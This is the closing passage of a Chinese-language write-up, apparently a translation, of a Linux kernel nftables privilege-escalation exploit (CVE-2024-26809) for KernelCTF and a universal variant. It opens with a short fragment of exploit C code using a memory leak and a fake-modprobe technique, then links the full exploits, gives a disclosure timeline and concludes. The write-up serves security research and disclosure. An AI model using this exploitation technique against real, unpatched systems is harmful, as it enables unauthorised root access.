            if (read(sock[i][1], leak, 1024 - 320) < 0)
            {
                perror("[-] read(socket)");
                return -1;
            }
        }
    }
    puts("[-] fake modprobe failed");
[...]
```  
### 通用漏洞利用演示  
  
你可以在我们的  
GitHub[13]  
 上找到完整的通用漏洞利用代码。  
## 披露时间线  
- 3 月 21 日 -- 补丁公开发布  
  
- 3 月 23 日 -- 浏览提交记录并发现漏洞修复  
  
- 3 月 24 日 -- 编写 KernelCTF 漏洞利用代码  
  
- 3 月 26 日 -- 编写通用漏洞利用代码  
  
- 5 月 23 日 -- 补丁在 Ubuntu 和 Debian 上发布  
  
值得注意的是，这个通用漏洞利用在主流发行版上存活了大约两个月。  
## 结论  
  
在本文中，我讨论了如何利用一个刚刚公开修复的漏洞来攻击最新稳定版本的内核，并长期维持类似零日漏洞的原语能力。我还讨论了利用该漏洞的两种不同方法：一种是用于攻击 KernelCTF 实例并获取 flag，另一种是用于制作一个通用的漏洞利用二进制文件，该文件可以在所有测试目标上稳定运行，无需适配或重新编译。  
  
我们观察到的现象并不新鲜；尽管 Linux 社区在提高内核安全性方面做出了努力和进展，但显而易见的是，可利用漏洞的供应仍然几乎是无限的，而开源补丁差距足够长，足以维持有效的攻击能力。  
### 参考资料  
  
[1]  
KernelCTF VRP:https://google.github.io/security-research/kernelctf/rules.html  
  
[2]  
lonial con:https://github.com/conlonialC  
  
[3]  
博客文章:https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/  
  
[4]  
1:https://pwning.tech/nftables  
  
[5]  
2:https://starlabs.sg/blog/2023/09-nftables-adventures-bug-hunting-and-n-day-exploitation  
  
[6]  
补丁:https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b0e256f3dd2ba6532f37c5c22e07cb07a36031ee  
  
[7]  
安全公告:https://ubuntu.com/security/CVE-2024-26809  
  
[8]  
提交:https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9827a0e6e23bf43003cd3d5b7fb11baf59a35e1e  
  
[9]  
提交:https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=5f68718b34a531a556f2f50300ead2862278da26  
  
[10]  
之前的 kernelCTF 漏洞利用:https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-4004_lts_cos_mitigation/docs/exploit.md  
  
[11]  
之前的 kernelCTF 提交:https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-0461_mitigation/docs/exploit.md#post-rip  
  
[12]  
GitHub:https://github.com/otter-sec/OtterRoot/blob/master/kernelctf/exploit.c  
  
[13]  
GitHub:https://github.com/otter-sec/OtterRoot/blob/master/universal/exploit.c  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原始披露 URL 尚未确认，现有链接按来源追溯区分别标注）
